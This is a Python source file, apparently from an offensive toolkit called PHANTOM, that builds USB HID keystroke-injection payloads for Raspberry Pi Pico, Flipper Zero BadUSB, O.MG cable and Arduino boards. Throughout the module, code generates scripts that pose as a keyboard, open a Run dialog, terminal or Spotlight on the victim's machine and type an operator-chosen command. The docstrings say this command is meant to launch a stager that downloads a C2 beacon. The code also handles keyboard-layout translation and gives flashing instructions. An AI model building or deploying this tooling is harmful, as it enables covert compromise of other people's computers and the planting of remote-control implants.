"""hid_builder.py — the USB HID delivery vector (9.1 / 9.2).

AutoRun on removable volumes has been disabled by Windows at the OS level
for years, so "drop a USB stick and wait" is not a vector: a mass-storage
device cannot be relied on to execute anything. What still works is a board
that PRESENTS ITSELF AS A KEYBOARD and types the payload into whatever
machine it is plugged into:

* ``pico``    — RP2040 / Raspberry Pi Pico running CircuitPython
                (``adafruit_hid``): the artefact is a ``main.py``;
* ``flipper`` — Flipper Zero BadUSB: a DuckyScript file;
* ``omg``     — O.MG cable web UI: DuckyScript as well, with its own
                replay/timing extensions;
* ``arduino`` — an Arduino-IDE board (ATmega32U4 / CH552 / ESP32 class)
                running the bundled ``Keyboard`` library: the artefact is a
                ``.ino`` sketch. These boards have far less flash than a
                CircuitPython Pico, which is fine: the payload is the TYPED
                COMMAND, and the beacon it launches is downloaded from the
                C2, never stored on the board.

The board carries firmware and the typed command, and nothing else. A
scant-flash board (tens of KB) is enough for exactly that reason: the
typed command is a short launcher for the resilient stager, so it works
when the C2 is not up yet — the stager retries by itself.

WHY THE OPERATOR CHOOSES (9.2): the same typed instruction cannot run on
every OS (a PowerShell one-liner is a syntax error on ``sh``, and PE ≠ ELF
≠ Mach-O for the binary it downloads), and there is no way for the board to
detect the target OS before executing — it types into whatever it is
plugged into. So the board, the target family and the command are explicit
operator choices, and this module's job is to make that choice precise,
warn about the mismatches it CAN see (a Windows Run-dialog keystroke on a
Linux target) and never to guess.

THE SECOND HALF OF "THE TARGET IS EXPLICIT" IS THE LAYOUT. A keystroke
injector sends HID usage codes; the target OS turns those into characters
with whatever layout it has active. Every table these boards ship
(``Keyboard.print``, ``KeyboardLayoutUS``, DuckyScript ``STRING``) is US, so
on an Italian target ``/`` and ``(`` — and ``{}``/``@``/``#`` behind AltGr —
come out as the wrong character. ``--layout it`` pre-translates the command
(``hid_layouts``) so the US codes sent are the ones an Italian keyboard maps
back to what we meant, and types AltGr-only characters as explicit key
combinations where the board can.

Pure text generation: no I/O, no flashing, nothing writes a file here. The
``payload hid`` command writes what this returns.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Optional, Sequence, Tuple

from phantom.utils.hid_layouts import (
    HID_LAYOUTS,
    normalize_layout,
    segments,
    special_key_chars,
    translate_text,
    unsupported_chars,
)

BOARDS = ("pico", "flipper", "omg", "arduino")

# boards whose artefact is DuckyScript (the two hardware keystroke injectors
# that ship on the operator's bench)
DUCKYSCRIPT_BOARDS = ("flipper", "omg")

# boards whose artefact is an Arduino-IDE sketch using the bundled
# ``Keyboard`` HID library (ATmega32U4 / CH552 / ESP32-class boards that
# present themselves as a keyboard). These have nowhere near the flash of a
# CircuitPython Pico, so they cannot carry the beacon either — the typed
# command is the whole payload, and it points at the C2 the beacon comes
# from.
ARDUINO_BOARDS = ("arduino",)

# How to open a place to type the command, per target family. The board is a
# keyboard: it can only hit the chord that opens a console on EACH family, so
# "universal" means "one chord per target", not "one chord for all". A step is
# ("keys", names) — press these together and release; ("tap", name) — press and
# release one key; ("text", s) — type a word.
_OPENERS = {
    "windows": (("keys", ("GUI", "R")),),
    "linux": (("keys", ("CTRL", "ALT", "T")),),
    "macos": (
        ("keys", ("GUI", "SPACE")),
        ("text", "terminal"),
        ("tap", "ENTER"),
    ),
}

_OPENER_LABELS = {
    "windows": "run dialog (Win+R)",
    "linux": "terminal (Ctrl+Alt+T, the GNOME-family shortcut)",
    "macos": "Spotlight (Cmd+Space), typing 'terminal' to open the console",
}

# logical key name -> the token each generator prints
_DUCKY_KEY = {
    "GUI": "GUI", "CTRL": "CTRL", "ALT": "ALT", "SHIFT": "SHIFT",
    "ENTER": "ENTER", "SPACE": "SPACE", "R": "R", "T": "T",
}

_ARDUINO_KEY = {
    "GUI": "KEY_LEFT_GUI", "CTRL": "KEY_LEFT_CTRL", "ALT": "KEY_LEFT_ALT",
    "SHIFT": "KEY_LEFT_SHIFT", "ENTER": "KEY_RETURN", "SPACE": "' '",
    "R": "'r'", "T": "'t'",
}

_PICO_KEY = {
    "GUI": "Keycode.GUI", "CTRL": "Keycode.CONTROL", "ALT": "Keycode.ALT",
    "SHIFT": "Keycode.LEFT_SHIFT", "ENTER": "Keycode.ENTER",
    "SPACE": "Keycode.SPACEBAR", "R": "Keycode.R", "T": "Keycode.T",
}

DEFAULT_DELAY_MS = 1500

# A keystroke injector types the command ON SCREEN. It has to be short
# enough that the operator can afford to watch it (and that a board with a
# per-line/per-file script cap can hold it). The C2 stager is the short
# form; a hand-pasted one-liner may not be, and that is worth saying out
# loud instead of emitting a 11k-char artefact in silence.
LONG_COMMAND_CHARS = 1024


@dataclass(frozen=True)
class HidPayload:
    """One flashable/writable artefact plus the caveats the operator needs."""

    board: str
    filename: str
    content: str
    target: str = ""
    layout: str = "us"
    notes: Tuple[str, ...] = ()

    @property
    def lines(self) -> int:
        return len([l for l in self.content.splitlines() if l.strip()])

    def summary(self) -> str:
        head = f"{self.board} HID payload -> {self.filename} ({self.lines} lines)"
        if self.target:
            head += f" for {self.target} targets"
        if self.layout != "us":
            head += f" ({self.layout} layout)"
        return " | ".join((head,) + tuple(self.notes))


def _opener_gap(delay_ms: int) -> int:
    return min(500, max(100, int(delay_ms) // 3))


def _c_escape(text: str) -> str:
    """Escape a string for a C literal: backslash then the closing quote."""
    return text.replace("\\", "\\\\").replace('"', '\\"')


def _duckyscript(command: str, *, delay_ms: int, press_enter: bool,
                 opener: Sequence[tuple], layout: str) -> str:
    lines = ["REM PHANTOM HID payload — types one command, then presses Enter",
             "REM flash/write this to the board; nothing executes on the "
             "operator box",
             f"DELAY {max(0, int(delay_ms))}"]
    for step in opener:
        kind = step[0]
        if kind == "keys":
            names = tuple(step[1])
            lines.append("REM open: " + " + ".join(_DUCKY_KEY[n] for n in names))
            lines.append("HOLD " + " ".join(_DUCKY_KEY[n] for n in names))
            # RELEASE matters: HOLD leaves the modifiers down and the next
            # STRING (or the typed command) would come out as shortcuts
            lines.append("RELEASE")
        elif kind == "tap":
            lines.append(_DUCKY_KEY[step[1]])
        elif kind == "text":
            lines.append("STRING " + step[1])
        lines.append(f"DELAY {_opener_gap(delay_ms)}")
    # STRING types the command verbatim; a leading SPACE would be typed too,
    # so the command is emitted on its own token
    lines.append("STRING " + translate_text(command, layout))
    if press_enter:
        lines.append("DELAY 200")
        lines.append("ENTER")
    return "\n".join(lines) + "\n"


def _arduino_opener(opener: Sequence[tuple], delay_ms: int) -> list:
    body = []
    gap = _opener_gap(delay_ms)
    for step in opener:
        kind = step[0]
        if kind == "keys":
            body.append("  // open: " + " + ".join(step[1]))
            for name in step[1]:
                body.append(f"  Keyboard.press({_ARDUINO_KEY[name]});")
            body.append("  Keyboard.releaseAll();")
            body.append(f"  delay({gap});")
        elif kind == "tap":
            body.append(f"  Keyboard.press({_ARDUINO_KEY[step[1]]});")
            body.append("  Keyboard.releaseAll();")
            body.append(f"  delay({gap});")
        elif kind == "text":
            body.append(f'  Keyboard.print(F("{_c_escape(step[1])}"));')
            body.append(f"  delay({gap});")
    return body


def _arduino_typing(command: str, layout: str) -> list:
    body = []
    if layout == "us":
        body.append("  // the command, typed verbatim (F() keeps it in flash, "
                    "not RAM)")
        body.append(f'  Keyboard.print(F("{_c_escape(command)}"));')
        return body
    for segment in segments(command, layout):
        if segment.kind == "print":
            body.append(f'  Keyboard.print(F("{_c_escape(segment.text)}"));')
            continue
        mods = []
        if segment.altgr:
            mods.append("KEY_RIGHT_ALT")
        if segment.shift:
            mods.append("KEY_LEFT_SHIFT")
        why = "AltGr" if segment.altgr else "non-US"
        body.append(f"  // {why} key, HID usage 0x{segment.usage:02X}")
        for mod in mods:
            body.append(f"  Keyboard.press({mod});")
        body.append(f"  Keyboard.press(0x{segment.usage:02X});")
        body.append("  Keyboard.releaseAll();")
    return body


def _arduino_sketch(command: str, *, delay_ms: int, press_enter: bool,
                    opener: Sequence[tuple], layout: str) -> str:
    """An Arduino-IDE sketch for a RAM-constrained keystroke board.

    ``Keyboard.print`` reads the command from PROGMEM (``F(...)``), so an
    11k-char command does not have to fit in the ~2.5 KB SRAM an ATmega32U4
    has — it only has to fit in flash, which it does. This is why a 42 KB
    board is enough for the stager: the beacon is never on the board.
    """
    body = [
        "// PHANTOM HID payload — Arduino-IDE keystroke board (Keyboard.h).",
        "// Flash with the Arduino IDE: the board presents itself as a",
        "// keyboard and types ONE command, then presses Enter.",
    ]
    if layout != "us":
        body.append(f"// target keyboard layout: {layout} (US codes "
                    f"pre-translated)")
    body += [
        "#include <Keyboard.h>",
        "",
        "void setup() {",
        f"  delay({max(0, int(delay_ms))});  // host enumerates the HID device",
        "  Keyboard.begin();",
    ]
    body += _arduino_opener(opener, delay_ms)
    body += _arduino_typing(command, layout)
    if press_enter:
        body += [
            "  delay(200);",
            "  Keyboard.press(KEY_RETURN);",
            "  Keyboard.releaseAll();",
        ]
    body += [
        "}",
        "",
        "void loop() {}",
        "",
    ]
    return "\n".join(body)


def _pico_opener(opener: Sequence[tuple], delay_ms: int) -> list:
    body = []
    gap = min(0.5, max(0.1, delay_ms / 3000.0))
    for step in opener:
        kind = step[0]
        if kind == "keys":
            names = ", ".join(_PICO_KEY[n] for n in step[1])
            body.append("# open: " + " + ".join(step[1]))
            body.append(f"kbd.press({names})")
            body.append("kbd.release_all()")
            body.append(f"time.sleep({gap:.2f})")
        elif kind == "tap":
            body.append(f"kbd.press({_PICO_KEY[step[1]]})")
            body.append("kbd.release_all()")
            body.append(f"time.sleep({gap:.2f})")
        elif kind == "text":
            body.append(f"layout.write({step[1]!r})")
            body.append(f"time.sleep({gap:.2f})")
    return body


def _pico_typing(command: str, layout: str) -> list:
    body = []
    if layout == "us":
        body.append("# the command, typed verbatim")
        body.append(f"layout.write({command!r})")
        return body
    for segment in segments(command, layout):
        if segment.kind == "print":
            body.append(f"layout.write({segment.text!r})")
            continue
        args = []
        if segment.altgr:
            args.append("Keycode.RIGHT_ALT")
        if segment.shift:
            args.append("Keycode.LEFT_SHIFT")
        args.append(f"0x{segment.usage:02X}")
        why = "AltGr" if segment.altgr else "non-US"
        body.append(f"# {why} key, HID usage 0x{segment.usage:02X}")
        body.append("kbd.press(" + ", ".join(args) + ")")
        body.append("kbd.release_all()")
    return body


def _circuitpython(command: str, *, delay_ms: int, press_enter: bool,
                   opener: Sequence[tuple], layout: str) -> str:
    body = [
        "# PHANTOM HID payload — RP2040 / Pico, CircuitPython.",
        "# Copy this file to the board as main.py (with the adafruit_hid",
        "# library in lib/). The board presents itself as a keyboard and",
        "# types ONE command, then presses Enter.",
        "import time",
        "import usb_hid",
        "from adafruit_hid.keyboard import Keyboard",
        "from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS",
        "from adafruit_hid.keycode import Keycode",
        "",
        "kbd = Keyboard(usb_hid.devices)",
        "layout = KeyboardLayoutUS(kbd)",
        "",
        f"time.sleep({max(0.1, delay_ms / 1000.0):.2f})  # host enumerates the HID device",
        "",
    ]
    if layout != "us":
        body.append(f"# target keyboard layout: {layout} (US codes "
                    f"pre-translated)")
        body.append("")
    body += _pico_opener(opener, delay_ms)
    if opener:
        body.append("")
    body += _pico_typing(command, layout)
    if press_enter:
        body += [
            "",
            "time.sleep(0.2)",
            "kbd.press(Keycode.ENTER)",
            "kbd.release_all()",
            "",
        ]
    return "\n".join(body)


def build_hid_payload(board: str, command: str, *,
                      target: str = "",
                      layout: str = "us",
                      delay_ms: int = DEFAULT_DELAY_MS,
                      press_enter: bool = True,
                      open_run: bool = False) -> HidPayload:
    """Build the artefact for one board, or say why it cannot be built.

    ``layout`` is the layout the TARGET has active (``us``/``it``): the typed
    command is pre-translated so the US scan codes these boards send come out
    as the intended characters.

    Raises ``ValueError`` on an unknown board, an unknown layout or an empty
    command: a blank HID payload is a bad flash, not a silent no-op.
    """
    board = (board or "").strip().lower()
    if board not in BOARDS:
        raise ValueError(f"unknown HID board {board!r}: choose from "
                         f"{', '.join(BOARDS)}")
    layout = normalize_layout(layout)
    command = (command or "").strip()
    # the operator quotes the command on the command line; a keystroke
    # injector would type those grouping quotes as part of the instruction
    if len(command) >= 2 and command[0] == command[-1] \
            and command[0] in "\"'":
        command = command[1:-1].strip()
    if not command:
        raise ValueError("no command to type: a HID payload cannot be empty")
    target = (target or "").strip().lower()

    notes = []
    opener: Tuple[tuple, ...] = ()
    if open_run:
        if target in _OPENERS:
            opener = _OPENERS[target]
            notes.append(f"target {target}: opens the "
                         f"{_OPENER_LABELS[target]} before typing")
        elif target:
            notes.append(
                f"target {target}: no opener is known for it — open a shell "
                f"on the target yourself, the board cannot guess the keystroke")
        else:
            # no target: fall back to the one opener that is on every Windows
            # box, and SAY that is the assumption
            opener = _OPENERS["windows"]
            notes.append("no target given: assuming a Windows run dialog "
                         "(Win+R); pass --target for the right opener")
    if (
        target == "windows"
        and command.lstrip().lower().startswith(("sh ", "bash ", "curl -sk"))
    ):
        notes.append("the command looks POSIX but the target is Windows")
    if target and target != "windows" and command.lstrip().lower().startswith(
            ("powershell", "cmd ", "-enc")):
        notes.append(f"the command looks Windows but the target is {target}")
    if not target:
        notes.append("the typed command must match the TARGET os: nothing "
                     "here detects it (the board types into whatever it is "
                     "plugged into)")

    if layout != "us":
        missing = unsupported_chars(command, layout)
        if missing:
            notes.append(
                f"layout {layout}: no key produces {''.join(missing)!r} — the "
                f"board will type something else there; reword the command")
        needs_keys = special_key_chars(command, layout)
        if needs_keys and board in DUCKYSCRIPT_BOARDS:
            notes.append(
                f"layout {layout}: DuckyScript STRING cannot type "
                f"{''.join(needs_keys)!r} (they need AltGr or a non-US key) — "
                f"shorten or reword the command")
        elif needs_keys:
            notes.append(
                f"layout {layout}: {''.join(needs_keys)!r} are typed as "
                f"explicit AltGr / non-US key combinations")

    if len(command) > LONG_COMMAND_CHARS:
        notes.append(
            f"very long command ({len(command)} chars): a keystroke injector "
            f"types it on screen IN FULL and it takes seconds — keep the "
            f"target focused and the board plugged in until typing finishes")

    if board in DUCKYSCRIPT_BOARDS:
        content = _duckyscript(command, delay_ms=delay_ms,
                               press_enter=press_enter, opener=opener,
                               layout=layout)
        filename = "phantom_hid.txt"
    elif board in ARDUINO_BOARDS:
        content = _arduino_sketch(command, delay_ms=delay_ms,
                                  press_enter=press_enter, opener=opener,
                                  layout=layout)
        filename = "phantom_hid.ino"
    else:
        content = _circuitpython(command, delay_ms=delay_ms,
                                 press_enter=press_enter, opener=opener,
                                 layout=layout)
        filename = "main.py"
    return HidPayload(board=board, filename=filename, content=content,
                      target=target, layout=layout, notes=tuple(notes))


def board_notes(board: str) -> Tuple[str, ...]:
    """How each board is flashed — the part that is not in the artefact."""
    board = (board or "").strip().lower()
    if board == "pico":
        return ("copy board firmware + lib/adafruit_hid, then write main.py "
                "to the CIRCUITPY volume",
                "a Pico is the only board here that can be rebuilt from a "
                "plain USB cable (RP2040 BOOTSEL)",)
    if board == "flipper":
        return ("copy the .txt to /ext/badusb/ on the SD card, then "
                "BadUSB -> the script (the Flipper acts as the keyboard)",)
    if board == "omg":
        return ("paste the DuckyScript into the O.MG cable web UI and store "
                "it on the device (the cable is the keyboard)",)
    if board in ARDUINO_BOARDS:
        return ("open the .ino in the Arduino IDE and upload it: the board "
                "is the keyboard",
                "the Arduino IDE refuses a sketch whose folder is not named "
                "after the .ino file: keep them together, e.g. "
                "arduino_phantom_hid/arduino_phantom_hid.ino (the default "
                "output path already does this)",
                "the payload is the TYPED COMMAND, not a file on the board — "
                "a 42 KB flash board carries the stager fine because the "
                "beacon is downloaded, never stored",
                "F() keeps the string in flash: an ATmega-class board with "
                "~2.5 KB of RAM still types a multi-kilobyte command")
    return ()
